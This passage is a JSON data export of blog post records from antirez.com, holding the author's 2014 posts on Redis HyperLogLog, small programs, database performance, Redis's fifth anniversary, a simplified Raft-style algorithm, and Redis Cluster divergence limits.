Actually I was not right and the malloc implementation inside the Glibc is BSD licensed, so it is not a license issue. I don't know why the Glibc is not using Jemalloc instead that is very good and actively developed allocator. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2014-04-10T09:06:18Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 5846.8071411, "slug": "using-heartbleed-as-a-starting-point-64", "topics": []}}, {"model": "app.post", "pk": 65, "fields": {"title": "Redis new data structure: the HyperLogLog", "link": "http://antirez.com/news/75", "source": 1, "normalized_link": "antirez.com/news/75", "summary": "Generally speaking, I love randomized algorithms, but there is one I love particularly since even after you understand how it works, it still remains magical from a programmer point of view. It accomplishes something that is almost illogical given how little it asks for in terms of time or space. This algorithm is called HyperLogLog, and today it is introduced as a new data structure for Redis.  Counting unique things ===  Usually counting unique things, for example the number of unique IPs that connected today to your web site, or the number of unique searches that your users performed, requires to remember all the unique elements encountered so far, in order to match the next element with the set of already seen elements, and increment a counter only if the new element was never seen before.  This requires an amount of memory proportional to the cardinality (number of items) in the set we are counting, which is, often absolutely prohibitive.  There is a class of algorithms that use randomization in order to provide an approximation of the number of unique elements in a set using just a constant, and small, amount of memory. The best of such algorithms currently known is called HyperLogLog, and is due to Philippe Flajolet.  HyperLogLog is remarkable as it provides a very good approximation of the cardinality of a set even using a very small amount of memory. In the Redis implementation it only uses 12kbytes per key to count with a standard error of 0.81%, and there is no limit to the number of items you can count, unless you approach 2^64 items (which seems quite unlikely).  The algorithm is documented in the original paper [1], and its practical implementation and variants were covered in depth by a 2013 paper from Google [2].  [1] http://algo.inria.fr/flajolet/Publications/FlFuGaMe07.pdf [2] http://static.googleusercontent.com/media/research.google.com/en//pubs/archive/40671.pdf  How it works? ===  There are plenty of wonderful resources to learn more about HyperLogLog, such as [3].  [3] http://blog.aggregateknowledge.com/2012/10/25/sketch-of-the-day-hyperloglog-cornerstone-of-a-big-data-infrastructure/  Here I\u2019ll cover only the basic idea using a very clever example found at [3]. Imagine you tell me you spent your day flipping a coin, counting how many times you encountered a non interrupted run of heads. If you tell me that the maximum run was of 3 heads, I can imagine that you did not really flipped the coin a lot of times. If instead your longest run was 13, you probably spent a lot of time flipping the coin.  However if you get lucky and the first time you get 10 heads, an event that is unlikely but possible, and then stop flipping your coin, I\u2019ll provide you a very wrong approximation of the time you spent flipping the coin. So I may ask you to repeat the experiment, but this time using 10 coins, and 10 different piece of papers, one per coin, where you record the longest run of heads. This time since I can observe more data, my estimation will be better.  Long story short this is what HyperLogLog does: it hashes every new element you observe. Part of the hash is used to index a register (the coin+paper pair, in our previous example. Basically we are splitting the original set into m subsets). The other part of the hash is used to count the longest run of leading zeroes in the hash (our run of heads). The probability of a run of N+1 zeroes is half the probability of a run of length N, so observing the value of the different registers, that are set to the maximum run of zeroes observed so far for a given subset, HyperLogLog is able to provide a very good approximated cardinality.  The Redis implementation ===   The standard error of HyperLogLog is 1.04/sqrt(m), where \u201cm\u201d is the number of registers used. Redis uses 16384 registers, so the standard error is 0.81%.  Since the hash function used in the Redis implementation has a 64 bit output, and we use 14 bits of the hash output in order to address our 16k registers, we are left with 50 bits, so the longest run of zeroes we can encounter will fit a 6 bit register. This is why a Redis HyperLogLog value only uses 12k bytes for 16k registers.  Because of the use of a 64 bit output function, which is one of the modifications of the algorithm that Google presented in [2], there are no practical limits to the cardinality of the sets we can count. Moreover it is worth to note that the error for very small cardinalities tend to be very small. The following graph shows a run of the algorithm against two different large sets. The cardinality of the set is shown in the x axis, while the relative error (in percentage) in the y axis.  img://antirez.com/misc/hll_1.png  The red and green lines are two different runs with two totally unrelated sets. It shows how the error is consistent as the cardinality increases. However for much smaller cardinalities, you can enjoy a much smaller error:  img://antirez.com/misc/hll_2.png  The green line shows the error of a single run up to cardinality 100, while the red line is the maximum error found in 100 runs. Up to a cardinality of a few hundreds the algorithm is very likely to make a very small error or to provide the exact answer. This is very valuable when the computed value is shown to an user that can visually match if the answer is correct.  The source code of the Redis implementation is available at Github:  https://github.com/antirez/redis/blob/unstable/src/hyperloglog.c  The API ===  From the point of view of Redis an HyperLogLog is just a string, that happens to be exactly 12k + 8 bytes in length (12296 bytes to be precise). All the HyperLogLog commands will happily run if called with a String value exactly of this size, or will report an error. However all the calls are safe whatever is stored in the string: you can store garbage and still ask for an estimation of the cardinality. In no case this will make the server crash.  Also everything in the representation is endian neutral and is not affected by the processor word size, so a 32 bit big endian processor can read the HLL of a 64 bit little endian processor.  The fact that HyperLogLogs are strings avoided the introduction of an actual type at RDB level. This allows the work to be back ported into Redis 2.8 in the next days, so you\u2019ll be able to use HyperLogLogs ASAP. Moreover the format is automatically serialized, and can be retrieved and restored easily.  The API is constituted of three new commands:  PFADD var element element \u2026 element PFCOUNT var PFMERGE dst src src src \u2026 src  The commands prefix is \u201cPF\u201d in honor of Philippe Flajolet [4].  [4] http://en.wikipedia.org/wiki/Philippe_Flajolet  PFADD adds elements to the HLL stored at \u201cvar\u201d. If the variable does not exist, an empty HLL is automatically created as it happens always with Redis API calls. The command is variadic, so allows for very aggressive pipelining and mass insertion.  The command returns 1 if the underlying HyperLogLog was modified, otherwise 0 is returned. This is interesting for the user since as we add elements the probability of an element actually modifying some register decreases. The fact that the API is able to provide hints about the fact that a new cardinality is available allows for programs that continuously add elements and retrieve the approximated cardinality only when a new one is available.  PFCOUNT returns the estimated cardinality, which is zero if the key does not exist.  Finallly PFMERGE can merge N different HLL values into one. The resulting HLL will report an estimated cardinality that is the cardinality of the union of the different sets that we counted with the different HLL values. This seems magical but works because HLL while randomized is fully deterministic, so PFMERGE just takes, for every register, the maximum value available across the N HLL values. A given element hashes to the same register with the same run of zeroes always, so the merge performed in this way will only add the count of the elements that are not common to the different HLLs.  As you can see HyperLogLog is fully parallelizable, since it is possible to split a set into N subsets counted independently to later merge the values and obtain the total cardinality approximation. The fact that HLLs in Redis are just strings helps to move HLL values across instances.  First make it correct, then make it fast ===  Redis HHLs are composed of 16k registers packed into 6 bit integers. This creates several performance issues that must be solved in order to provide an API of commands that can be called without thinking too much.  One problem is that accessing to registers require accessing multiple bytes, shifting, and masking in order to retrieve the correct 6 bit value. This is not a big problem for PFADD that only touches a register for every element, but PFCOUNT needs to perform a computation using all the 16k registers, so if there are non trivial constant times to access every single register, the command risks to be slow. Moreover, while accessing the registers, we need to compute the sum of pow(2,-register) which involves floating point math.  One may feel the temptation of using full bytes instead of 6 bit integers in order to speedup the computation, however this would be a shame since every HLL would use 16k instead of 12k that is a non trivial difference, so this route was discarded at the beginning. The command was optimized for a speedup of about 3 times compared to the initial implementation by doing the following changes:  * For m=16k which is the Redis default (the implementation is more generic and could theoretically work with different values) the implementation selects a fast-path with unrolled loops accessing 16 register at every time. The registers are accessed using fixed offsets / shifts / masks (via some pointer that is incremented 12 bytes at the next iteration). * The floating point computation was modified in order to allow for multiple operations to be performed in parallel when possible. This was just a matter of adding parens. Floating point math is not commutative, but in this case there was no loss of precision. * The pow(2,-register) term was precomputed in a lookup table.  With the 3x speedup provided by the above changes the command was able to perform about 60k calls per second in a fast hardware. However this is still far from the hundreds thousands calls possible with commands that are, from the user point of view, conceptually similar, like SCARD.  Instead of optimizing the computation of the approximated cardinality further, there was a simpler solution. Basically the output of the algorithm only changes if some register changes. However as already observed above, most of the PFADD calls don\u2019t result in any register changed. This basically means that it is possible to cache the last output and recompute it only if some register changes.  So our data structure has an additional tail of 8 bytes representing a 64bit unsigned integer in little endian format. If the most significant bit is set, then the precomputed value is stale and requires to be recomputed, otherwise PFCOUNT can use it as it is. PFADD just turns on the \u201cinvalid cache\u201d bit when some register is modified.  After this change even trying to add elements at maximum speed using a pipeline of 32 elements with 50 simultaneous clients, PFCOUNT was able to perform as well as any other O(1) command with very small constant times.  Bias correction using polynomial regression ===  The HLL algorithm, in order to be practical, must work equally well in any cardinality range. Unfortunately the raw estimation performed by the algorithm is not very good for cardinalities less than m*2.5 (around 40000 elements for m=16384) since in this range the algorithm outputs biased or even results with larger errors depending on the exact range.  The original HLL paper [1] suggests switching to Linear Counting [5] when the raw cardinality estimated by the first part of the HLL algorithm is less than m*2.5.  [5] http://dblab.kaist.ac.kr/Publication/pdf/ACM90_TODS_v15n2.pdf  Linear counting is a different cardinality estimator that uses a simple concept. We have a bitmap of N bits. Every time a new element must be counted, it is hashed, and the hash is used in order to index a random bit inside the bitmap, that is turned to 1. The number of unset bits in the bitmap gives an idea of how many elements we added so far using the following formula:      cardinality = m*log(m/ez);  Where \u2018ez\u2019 is the number of zero bits and m is the total number of bits in the bitmap.  Linear counting does not work well for large cardinalities compared to HyperLogLog, but works very well for small cardinalities. Since the HLL registers as a side effect also work as a linear counting bitmap, counting the number of zero registers it is possible to apply linear counting for the range where HLL does not perform well. Note that this is possible because when we update the registers, we don\u2019t really use the longest run of zeroes, but the longest run of zeroes plus one. This means that if an element is added and it is addressing a register that was never addressed, the register will turn from 0 to a different value (at least 1).  The problem with linear counting is that as the cardinality gets bigger, its output error gets larger, so we need to switch to HLL ASAP. However when we switch at 2.5m, HLL is still biased. In the following image the same cardinality was tested with 1000 different sets, and the error of each run is reported as a point:  img://antirez.com/misc/hll_3.png  The blu line is the average of the error. As you can see before a cardinality of 40k, where linear counting is used, the more we go towards greater cardinalities, the more the points \u201cbeam\u201d gets larger (bigger errors). When we switch to HLL raw estimate the error is smaller, but there is a bias: the algorithm overestimates the cardinality in the range 40k-80k.  Google engineers studied this problem extensively [2] in order to correct the bias. Their solution was to create an empirical table of cardinality values and the corresponding biases. Their modified algorithm uses the table and interpolation in order to get the bias in a given range, and correct accordingly.  I used a different approach: you can see that the bias is not random but looks like a very smooth curve, so I calculated a few cardinality-bias samples and performed polynomial regression in order to find a polynomial approximating the curve.  Currently I\u2019m using a four order polynomial to correct in the range 40960-72000, and the following is the result after the bias correction:  img://antirez.com/misc/hll_4.png  While there is still some bias at the switching point between the two algorithms, the result is quite satisfying compared to the vanilla HLL algorithm, however it is probably possible to use a curve that fits better the bias curve. I had no time to investigate this further.  It is worth to note that during my investigations I found that, when no bias correction is used, and at least for m=16384, the best value to switch from linear counting to raw HLL estimate is actually near 3 and not 2.5 as mentioned in [1], since a value of 3 both improves bias and error. Values larger than 3 will improve the bias (a value of 4 completely corrects it) but will have bad effects on the error.  The original HLL algorithm also corrects for values towards 2^32 [1][2] since once we approach very large values collisions in the hash function starts to be an issue. We don\u2019t need such correction since we use a 64 bit hash function and 6 bits counters, which is one of the modifications proposed by Google engineers [2] and adopted by the Redis implementation.  Future work ===  Intuitively it seems like it is possible to improve the error of the algorithm output when linear counting is used by exploiting the additional informations we have. In the standard linear counting algorithm the registers are just 1 bit wide, so we have only two informations: if an element so far hashed to this bit or not. Still the HLL algorithm as proposed initially [1] and as modified at Google [2], when reverting to linear counting still only use the number of zero registers as the input of the algorithm. It is possible that also using the information stored in the registers could improve the output.  For example in standard linear counting, assuming we have 10 bits, I may add 5 elements that all happen to address the same bit. This is an odd case that the algorithm has no way to correct, and the estimation provided will likely be smaller than the actual cardinality. However in the linear counting algorithm used by HLL in a similar situation we may found that the value at the only register set is an hint about multiple elements colliding there, allowing a correction of the output.  Conclusion ===  HyperLogLog is an amazing data structure. My hope is that the Redis implementation, that will be available in a stable release in a matter of days (Redis 2.8.9 will include it), will provide this tool in a ready to use form to many programmers.  The HN post is here: https://news.ycombinator.com/item?id=7506774 Comments", "content": "", "cover_photo_url": "http://antirez.com/misc/hll_1.png", "profile": 4, "updated_on": "2014-04-01T08:16:35Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 5829.4608522, "slug": "redis-new-data-structure-the-hyperloglog-65", "topics": []}}, {"model": "app.post", "pk": 66, "fields": {"title": "Fascinating little programs", "link": "http://antirez.com/news/74", "source": 1, "normalized_link": "antirez.com/news/74", "summary": "Yesterday and today I managed to spend some time with linenoise (http://github.com/antirez/linenoise), a minimal line-editing library designed to be a simple and small replacement for readline. I was trying to merge a few pull requests, to fix issues, and doing some refactoring at the same time. It was some kind of nirvana I was feeling: a complete control of small, self-contained, and useful code.  There is something special in simple code. Here I\u2019m not referring to simplicity to fight complexity or over engineering, but to simplicity per se, auto referential, without goals if not beauty, understandability and elegance.  After all the programming world has always been fascinated with small programs. For decades programmers challenged in 1k or 4k contexts, from the 6502 assembler to today\u2019s javascript contests. Even the obfuscated C contest, after all, has a big component in the minimalism.  Why is it so great to hack a small piece of code? Yes is small and simple, those are two good points. It can be totally understood, dominated. You can use smartness since little code is the only place of the world where coding smartness will pay off, since in large projects obviousness is far better in the long run. However I believe there is more than that, and is that small programs can be perfect. As perfect as a sonnet composed of a few words. The limits in size and in scope, constitute an intellectual stratagem to avoid the \u201cit may be better\" trap, when this better is not actually measurable and evident. Under these strict limits, what the program does is far more interesting than what it does not. Actually the constraints are the more fertile ground for creativity of the solutions, otherwise likely useless: at scale there is always a more correct, understood, canonical way to do everything.  There is an interview of Bill Gates in the first years of the Microsoft experience where he describes this feeling when writing the famous Microsoft BASIC interpreter. The limits were the same we self impose today to ourselves for fun, in the contests, or just for the sake of it. There was a generation of programmers that was able to experience perfection in their creations, where it was obvious to measure and understand if a change actually lead to an improvement of the program or not, in a territory where space and time were so scarse. There was no room for wastes and not needed complexity.  Today\u2019s software is in some way the triumph of the other reality of software: layers of complexities that gave use incredible devices or infrastructure technologies that in the hands of non experts leverage a number of possibilities. However maybe there is still something to preserve from the ancient times where software could be perfect, the feeling that what you are creating has a structure and is not just a pile of code that works. If you zoom out enough, you\u2019ll see your large program is actually quite small again, and at least at this scale, it should resemble perfection, or at least, aim at it. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2014-03-13T22:32:59Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 5794.1227189, "slug": "fascinating-little-programs-66", "topics": []}}, {"model": "app.post", "pk": 67, "fields": {"title": "What is performance?", "link": "http://antirez.com/news/73", "source": 1, "normalized_link": "antirez.com/news/73", "summary": "The title of this blog post is an apparently trivial to answer question, however it is worth to consider a bit better what performance really means: it is easy to get confused between scalability and performance, and to decompose performance, in the specific case of database systems, in its different main components, may not be trivial. In this short blog post I\u2019ll try to write down my current idea of what performance is in the context of database systems.  A good starting point is probably the first slide I use lately in my talks about Redis. This first slide is indeed about performance, and says that performance is mainly three different things.  1) Latency: the amount of time I need to get the reply for a query.  2) Operations per unit of time per core: how many queries (operations) the system is able to reply per second, in a given reference computational unit?  3) Quality of operations: how much work those operations are able to accomplish?  Latency \u2014  This is probably the simplest component of performance. In many applications it is desirable that the time needed to get a reply from the system is small. However while the average time is important, another concern is the predictability of the latency figure, and how much difference there is between the average case and the worst case. When used well, in-memory systems are able to provide very good latency characteristics, and are also able to provide a consistent latency over time.  Operations per second per core \u2014  The second component I\u2019m enumerating is what makes the difference between raw performance and scalability. We are interested in the amount of work the system is able to do, in a given unit of time, for a given reference computational unit. Linearly scalable systems can reach a big number of operations per second by using a number of nodes, however this means they are scalable, and not necessarily performant.  Operations per second per core is also usually bound to the amount of queries you can perform per watt, so to the energy efficiency of the system.   Quality of operations \u2014  The last point, while probably not as stressed among developers as throughput and latency, is really important in certain kind of systems, especially in-memory systems.  A system that is able to perform 100 operations per second, but with operations of \u201cpoor quality\u201d (for example just GET and SET in Redis terms) has a lower performance compared to a system that is also able to perform an INCR operation with the same latency and OPS characteristics. For instance, if the problem at hand is to increment counters, the former system will require two operations to increment a counter (we are not considering race conditions in this context), while the system providing INCR is able to use a single operation. As a result it is actually able to provide twice the performance of the former system.  As you can see the quality of operations is not an absolute meter, but depends on the kind of problem to solve. The same two systems if we want to cache HTML fragments are equivalent since the INCR operation would be useless.  The quality of operations is particularly important in in-memory systems, since usually the computation itself is negligible compared to the time needed to receive, dispatch the command, and create a reply, so systems like Redis with a rich set of operations are able to provide better performance in many contexts almost for free, just allowing the user to do more with a single operation. The \u201cdo more\u201d part can actually mean a lot of things: either provide a reply to a more complex question, like for example the ZRANK command of Redis, or simply being able to provide a more *selective* reply, like HMGET command that is able to provide information just for a subset of the fields composing an Hash value, reducing the amount of bandwidth required between the server and its clients.  In general quality of operations don't only affect performances because they give less or more value to the operations per second the system is able to perform: operations quality also directly affect latency, since more complex operations are able to avoid back and forth data transfer between clients and servers required to mount multiple simpler operations into a more complex computation.  Conclusion \u2014  I hope that this short exploration of what performance is uncovered some of the complexities involved in the process of evaluating the capabilities of a database system from this specific point of view. There is a lot more to say about it, but I found that the above three components of the performance are among the most interesting and important when evaluating a system and when there is to understand how to evolve an existing system to improve its performance characteristics.  Thanks to Yiftach Shoolman for feedbacks about this topic. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2014-02-28T13:30:42Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 5768.4396744, "slug": "what-is-performance-67", "topics": []}}, {"model": "app.post", "pk": 68, "fields": {"title": "Happy birthday Redis!", "link": "http://antirez.com/news/72", "source": 1, "normalized_link": "antirez.com/news/72", "summary": "Today Redis is 5 years old, at least if we count starting from the initial HN announcement [1], that\u2019s actually a good starting point. After all an open source project really exists as soon as it is public.  I\u2019m a bit shocked I worked for five years straight to the same thing. The opportunities for learning new things I had because of the directions where Redis pushed me, and the opportunities to learn new things that I missed because I had almost consistently no time for random hacking, are huge.  My feeling today is that the Redis project was possible because of the great coders I encountered in my journey: they made Redis popular adopting it in its infancy, since great coders don\u2019t follow the hype. Great coders provided outstanding additions to Redis in the form of patches and ideas that were able to surpass my instinct to be conservative when the topic was to extend the system or accept external contributions. More great coders made possible to sponsor Redis when it was in its infancy, recognizing that there was something interesting about it, and more great coders applied it in the right way to solve problems in the course of many years, wrote an incredible ecosystem of client libraries and tools, and helped other coders to apply it when it was not clear what was the best way to solve a given problem.  The Redis community is outstanding because in some way it managed to attract a number of great coders.  I learned that in the future, whatever I\u2019ll do more coding or I\u2019ll be in a team to build something great in a different role, my top priority will be to stay with great coders, and I learned that they are not easy to recognize at first: their abilities don\u2019t correlate with the number of followers on Twitter nor with the number of Github repositories. You have to discover great coders one after the other, and the biggest gift that Redis provided to me, was to get exposed to many of them.  In the course of five years there was also time, for me, to evolve my idea of what Redis is. The idea I\u2019ve of Redis today is that its contribution should be to try to explore corner designs and bizzarre ideas. After all there are large teams of people much smarter than me trying to work on the hard problems applying the best technologies available.  Redis will continue to be a small research in more obscure places of the design space. After all I\u2019ve the feeling that it helped to popularize certain non obvious ideas, like using data structures as data model for key value stores and caches, or that it is possible to apply scripting to database systems in a different way than stored procedures.  However for Redis to be able to do this research, I should be ready to be opinionated and change development direction when something is weak. This was done in the past, deprecating swap and diskstore, but should be done even more in the future.  Moreover Redis should be able to purse different goals at the same time: once Redis 3.0 will be stable, the design of Redis Cluster is conceived in order to leave my hands free about changes in the data model, without too much limits or compromises. This will result in a Redis 3.2 release that will focus again on the API, stressing one of the initial and fundamental aspects of Redis: caching, data model and computation.  It is entirely not obvious to me, after five years, to consider the Redis journey still ongoing, and I\u2019m happy about it, because my motivations are not investors or shares, nor that I\u2019m particularly in love with Redis as a project. If something new appears tomorrow that marginalizes Redis and makes it totally useless I\u2019ll be very happy to start some new gig, after all this is how technology works: for cycles. And, after all, starting from scratch with something new is always exciting. However currently I believe there is more to do about Redis, and I\u2019ll be happy to continue my work on it in the next weeks.  [1] https://news.ycombinator.com/item?id=494649 Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2014-02-26T09:19:41Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 5764.2649856, "slug": "happy-birthday-redis-68", "topics": []}}, {"model": "app.post", "pk": 69, "fields": {"title": "A simple distributed algorithm for small idempotent information", "link": "http://antirez.com/news/71", "source": 1, "normalized_link": "antirez.com/news/71", "summary": "In this blog post I\u2019m going to describe a very simple distributed algorithm that is useful in different programming scenarios. The algorithm is useful when you need to take some kind of information synchronized among a number of processes. The information can be everything as long as it is composed of a small number of bytes, and as long as it is idempotent, that is, the current value of the information does not depend on the previous value, and we can just replace an old value, with the new one.  The size of the information is important because for the way the algorithm works, the information should be small enough that every node can broadcast it from time to time to some other random node, so it should fit the size of an \u201cheartbeat\u201d packet. Let\u2019s say that up to a few kbytes everything is fine.  This algorithm is no new in any way, it is basically just a trivial way to put together obvious ideas found in other distributed algorithms in a simple way. However the algorithm is very useful in many real-world contexts, and is extremely simple to implement. The algorithm is mostly borrowed from Raft, however because of the premises it uses only a subset of Raft that is trivial to implement.  An example scenario ===  To understand better the algorithm, it is much better to have an example of problem that we want to solve in our distributed system. Let\u2019s say that we have N processes connected with two kind of wifi networks: a very reliable but slow wireless network, that is only suitable to send \u201ccontrol\u201d packets like heartbeats or other low bandwidth data, and a very fast wireless network.  Now let\u2019s imagine that while the slow network works at a fixed frequency, the high speed wireless network requires to adapt to changing conditions and noises in a given frequency, and is able to hop to a different frequency as soon as too much noise is detected.  We need a way to make sure that all the processes use the same frequency to communicate with the high speed network, and we also need a way to switch frequency when the currently used frequency has issues. We need this system to work if there are network partitions in the slow network, as long as the majority of the processes are able to communicate.  Note that this problem has the properties stated above:  1) The information is idempotent, if the high speed network switched to an different frequency, the new frequency does not depend on the old frequency. A process receiving the new frequency can just update frequency regardless of the fact that its old frequency was updated, or an older one (because for some reason it did not received some update).  2) The information is small, it is possible to propagate it easily across nodes in a small data packet. In this case it is actually extremely small, for example the frequency may be encoded in a 64 bit integer.  Epochs and update messages ===  The basic idea of this algorithm is that there is an artificial notion of time across the processes, that is used to order events or informations without to resort to the system time of the process, that is hard to synchronize between them. This artificial time is called the \u201cepoch\u201d. Every process has the notion of currentEpoch, that is, initialized at zero at startup. Every time a process sees an epoch that is greater that its current epoch, it updates its epoch to match the observed epoch.  Every process has also the notion of the frequencyEpoch, that is, the version of the currently used frequency.  In order to propagate the information, every process periodically sends an update message to some other process. For example every 5 seconds every process picks a random process, and sends to it an update message containing: the current frequency in use, the epoch of the frequency used, and the currentEpoch of the process sending the update message.  The first time a process is created its frequency is set to -1: this means that there is no frequency currently in use from the point of view of a given process, and that another one must be picked.  Updating the frequency ===  When a process receives an update message from another process  containing a frequency with a frequencyEpoch that is greater than its local frequencyEpoch, it updates its frequency to the received value, and sets the frequencyEpoch to the received value as well.  In general when the currentEpoch or the frequency and frequencyEpoch are modified, the process writes this change to the disk or other permanente storage, so that when the process is restarted it will use the latest known information.  Choosing a frequency ===  A process requires to choose a frequency in two different scenarios:  1) When the current frequency is detected to be noisy. 2) When the current frequency is set to -1 (at startup).  In order to choose a frequency, a process requires to win an election.  This is how it works:  1) The process increments its own currentEpoch, and writes it to permanent storage. It also selects a suitable new frequency.  2) The process sends to all the other processes a ELECT_ME packet to get the vote of the other processes. The ELECT_ME packet contains the currentEpoch of the sending process.  3) The other processes will reply with YOU_HAVE_MY_VOTE packet only if their currentEpoch is not greater compared to the one of the process requesting the vote (it can\u2019t be smaller, since the reception of the ELECT_ME packet will cause an older currentEpoch to be updated to match the one of the incoming packet). The YOU_HAVE_MY_VOTE packet contains the currentEpoch of the voting process.  4) A given process only votes a single time for a given epoch, so it takes a variable called lastVoteEpoch, and will only provide its vote if the currentEpoch in the request for the vote is greater (>) than lastVoteEpoch. When the vote is provided, lastVoteEpoch is updated (and stored on disk *before* the vote is provided, so that a crash and restart will not cause this process to vote again for the same epoch).  5) YOU_HAVE_MY_VOTE messages with a currentEpoch smaller than the currentEpoch of the process that requested the vote are discarded.  6) The process requesting the vote will consider itself elected only if it receives the majority of the votes from the other processes (it will count itself as a voter and will vote for itself when the election starts). If the process is elected it will updated its frequencyEpoch and frequency variables. The frequencyEpoch that will be used is the epoch the process requested the vote with, that is, its currentEpoch at the time it sent the ELECT_ME packets, just after the increment.  Given that a process requires to be elected to change the frequency, and that every process votes a single time in a given epoch, there must be only a single winner for a given epoch.  If a given process is not able to get elected as the majority is not reached, it will try again after a random delay. This delay must be greater compared to the latency of the slow network that is used to exchange these messages (see the Raft paper for more information about this). Every process will consider the election aborted after some time that is smaller than the retry time.  Propagating the new information ===  When a process wins an election, it updates its frequency value and frequencyEpoch to the new one, so by sending UPDATE messages, eventually all the other processes will receive the update as well and will switch to the new frequency.  If some process is partitioned away, it will receive the update as soon as the partition heals.  However it is a good idea to broadcast an UPDATE message to all the processes ASAP as soon as a process changes the frequency, so that all the other nodes will switch ASAP.  Improving the algorithm with a simple change ===  The ELECT_ME packet can be improved by adding the value of the frequencyEpoch, so that other processes will refuse to vote if the process has a stale information. This may happen when, for example, the process was partitioned away for some time with an old frequency that does not work well as there is too much noise. So in a minority partition, it may try to get elected again and again. The majority probably already switched to a newer frequency.  When the partition heals, the process may get elected and change the frequency to something else before having the chance to receive the updated frequency, causing a useless frequency switch. By adding the frequencyEpoch in the ELECT_ME packet and by making other processes checking that the info is updated before providing the vote, we avoid this problem.  Other improvements ===  Another improvement may be to only provide the vote if the current frequency, from the point of view of the receiving node, is *really* noisy. This avoids that a single node having hardware issues in the high bandwidth radio will be able to continuously switch to new frequencies since every frequency will be detected as noisy. In this way a frequency switch can happen only if the majority of the nodes are detecting an issue with the current frequency.  Similarly the node sending ELECT_ME messages to get elected may include the frequency it want to switch to, and the receiving node may vote only if the selected frequency passes some test and is considered a good pick, however this may affect the liveness of the algorithm: different nodes may believe that different frequencies are not a good pick so that majority can\u2019t be reached.  Conclusions ===  What I did in this blog post is just to take Raft, that is able to handle the complex problem of replicating a state machine across different processes in a consistent way, and simplify it in order to use it in a subset of problems where the state is a single value (or a set of values) that can just be updated in an idempotent way.  The resulting algorithm is trivial to implement in a robust way, and is good enough for a non trivial set of real world problems.  ---------------------------------------  EDIT: I received some feedback via Twitter, and I think it is better to clarify what is the meaning of the above algorithm. The idea is to retain some safety under the specified scenario, where a replicated state machine is not needed, but still have a reasonable way to take a set of values synchronized across different processes. The goal is to provide, in exchange for the lack of functionality compared to Raft or Paxos, an algorithm that can be recalled by memory only without even reading a document. In this spirit my aim is to further simplify the above description of the algorithm without impacting the functionality.  Moreover as somebody that is trying to understand more about distributed programming, I see that while it is very simple without even being aware of it, to get involved in something that is a distributed system, as a normal programmer (given that everything is networked today), descriptions of trivial algorithms may be a way to get somewhat exposed to basic distributed concepts.  The next step is to learn a formal analysis tool and try to analyze the algorithm to provide a proof of safety / liveness. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2014-02-21T11:40:01Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 5754.8520967, "slug": "a-simple-distributed-algorithm-for-small-idempotent-information-69", "topics": []}}, {"model": "app.post", "pk": 70, "fields": {"title": "Redis Cluster and limiting divergences.", "link": "http://antirez.com/news/70", "source": 1, "normalized_link": "antirez.com/news/70", "summary": "Redis Cluster is finally on its road to reach the first stable release in a short timeframe as already discussed in the Redis google group [1]. However despite a design never proposed for the implementation of Redis Cluster was analyzed and discussed at long in the past weeks (unfortunately creating some confusion: many people, including notable personalities of the NoSQL movement, confused the analyzed proposal with Redis Cluster implementation), no attempt was made to analyze or categorize Redis Cluster itself.  I believe that putting in perspective the simple ideas that Redis Cluster implements, in a more formal way, is an interesting exercise for the following reason: Redis Cluster is not a design that tries to achieve \u201cAP\u201d or \u201cCP\u201d of the CAP theorem, since for its goals CAP Availability and CAP Consistency are too hard goals to reach without sacrificing other practical qualities.  Once a design does not try to maximize what is theoretically possible, the design space becomes much larger, and the implementation main goal is to try to provide some Availability and some reasonable form of Consistency, in the face of other conflicting design requirements like asynchronous replication of data.  The goal of this article is to reply to the following question: how Redis Cluster, as an asynchronous system, tries to limit divergences between nodes?  Nodes divergence ===  One of the main problems with asynchronous systems is that a master accepting requests never actually knows in a given moment if it is still the authoritative master or a stale one. For example imagine a cluster of three nodes A, B, C, with one replica each, A1, B1, C1. When a master is partitioned away with some client, A1 may be elected in the other side as the new master, but A is not able, for every request processed, to verify with the other nodes if the request should be accepted or not. At best node A can get asynchronous acknowledges from replicas.  Every time this happens, two parallel time lines for the same set of data is created, one in A, and one in A1. In Redis Cluster there is no way to merge data as explained in [2], so you can imagine the merge function between A and A1 data set when the partition heals as just picking one time line between all the time lines created (two in this case).  Another case that creates different time lines is the replication process itself.  A master A may have three replicas A1, A2, A3. Because of the very concept of asynchronous replication, each of the slaves may represent a point in time in the past history of the time line of A. Usually since replication in Redis is very fast and has minimal delay, as data is transmitted to slaves at the same time as the reply is transmitted to the writing client, the time \u201cdelta\u201d between A and the slaves is small. However slaves may be lagging for some reason, so it is possible that, for example, A1 is one second in the past.  Asynchronously replicated nodes can\u2019t really avoid diverging, however there is no need for the divergence between replicas to be unbound. Actually systems allowing replicas to diverge in an uncontrolled way may be hard to use in practice, even when for use case does not requiring strong consistency, that is the target of Redis Cluster.  Putting bounds to divergence ===  Redis cluster uses a few heuristics in order to limit divergence of nodes. The algorithms employed are very simple, consisting merely on the following four rules that nodes follow.  1) When a master is isolated from the majority for node-timeout (that is the user configured time after a non responding node is considered to be failing by the failure detection algorithm), it stops accepting queries from clients. It is easy to see how this helps in practice: in the majority side of the cluster, no slave is able to get elected and replace the master before node-timeout has elapsed. However, after node-timeout time has elapsed, the isolated master knows that it is possible that a parallel history was created in the other side of the cluster, and this history will win over its history, so it stops accepting data that will be otherwise lost. This means that if a master is partitioned away together with one or more clients, the window for data loss is node-timeout, that is usually in the order of 500 \u2014 1000 milliseconds. If the partition heals before node-timeout, no data loss happens as the master rejoins the cluster as master.  2) A related problem is, when a master is failing, how to pick the \u201cbest\u201d history among the available histories for the same data (depending on the number of slaves). An algorithm is used in order to give an advantage to the slave with the most updated replication offset to be elected, that is, the slave that likely has the most recent data compared to the master that went down. However if the best slave fails to be elected the other slaves will try an election 